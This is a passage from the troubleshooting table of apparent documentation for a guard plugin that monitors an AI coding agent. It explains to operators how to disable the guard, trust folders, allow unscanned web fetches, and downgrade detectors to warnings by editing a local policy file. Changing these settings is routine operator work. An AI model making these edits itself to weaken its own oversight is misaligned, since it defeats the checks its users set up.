The Supabase table is created by you, by running the SQL file.

---

## 12. Troubleshooting

| Symptom | Fix |
|---|---|
| No 🛡 messages at all | `/plugin` → check `truviq-guard` is enabled; run `/reload-plugins`; `python3 --version` must work in the shell Claude Code uses. |
| Every command is blocked with "TruViq Guard error" | Fail-safe is active. Read `~/.truviq/logs/guard-errors.log`; to unblock temporarily set `"mode": "off"` in `~/.truviq/policy.json`. |
| Claude keeps getting sent back with "tests fail" | The project's tests fail or need setup the guard can't do (database, services). Set your own `"quality": {"test_command": "pytest tests/unit -q"}` or `"run_tests": false` in `~/.truviq/policy.json`. After 2 rounds the guard hands the code back to you anyway. |
| "imports modules that do not exist here" for a real package | Add it to `requirements.txt` / `package.json`, or install it in the project's `.venv`. |
| Too many approval prompts while reading security docs | Add the folder to `trusted_paths` in `~/.truviq/policy.json`. |
| WebFetch always refused | That is the default (`webfetch: redirect`); Claude should use `guard_fetch`. Set `"webfetch": "scan"` to allow WebFetch with output scanning. |
| `status` shows `groq=yes` but classifier verdicts never come | Check the model is available to your key (`openai/gpt-oss-20b`); Llama models were retired on this key. |
| No email | `truviq.py test-email`; read `~/.truviq/logs/alerts.log`. With `onboarding@resend.dev` you can only send to your own Resend account address. Remember only injection, jailbreak and CRITICAL findings are emailed. |
| Dashboard badge says "Local · this machine only" | Add the service-role key on this machine: `truviq.py setup --import-env .env --with-service-key`. Check `status` shows `dashboard read key: yes`. |
| `doctor` says "Plugin installed: installed but disabled" | It really is disabled (`claude plugin list` shows `✘ disabled`). Enable it in the `/plugin` menu, then `/reload-plugins`. |
| Fleet health panel is empty | Machines send a heartbeat at session start, at most hourly, and need `SUPABASE_URL` + `SUPABASE_ANON_KEY`. Run `truviq.py heartbeat` on one machine and `truviq.py status`. Run `supabase/002_fleet_policy_redteam.sql` once. |
| `watchdog` says "Cannot read heartbeats" | The admin machine needs `SUPABASE_SERVICE_ROLE_KEY` (`setup --with-service-key`). |
| Dashboard shows "Supabase read failed" | Run `supabase/001_guard_events.sql` in the Supabase SQL editor; check `SUPABASE_URL`. |
| Events missing from the dashboard | `truviq.py status` shows `queued: N` → run `truviq.py ship` and read the message (offline, wrong anon key, or table missing). |
| Too many ASK prompts for dependency changes | Set `"detectors": {"G-DEP-003": {"action": "warn"}}` in `~/.truviq/policy.json`; look-alike, missing and vulnerable packages still ask or deny. |
| A card says "… could not run …; this change was not reviewed" (G-GUARD-ERR) | A review step crashed. The write was allowed, not blocked. Send `~/.truviq/logs/guard-errors.log`. |
